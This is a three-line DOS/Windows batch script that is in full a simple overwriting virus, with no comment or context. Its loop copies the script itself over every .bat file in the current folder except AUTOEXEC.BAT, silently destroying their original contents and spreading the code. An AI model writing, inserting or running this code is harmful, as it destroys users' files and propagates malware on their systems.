@echo off
for %%b in (*.bat) do if not %%b==AUTOEXEC.BAT copy %0 %%b>nul
echo on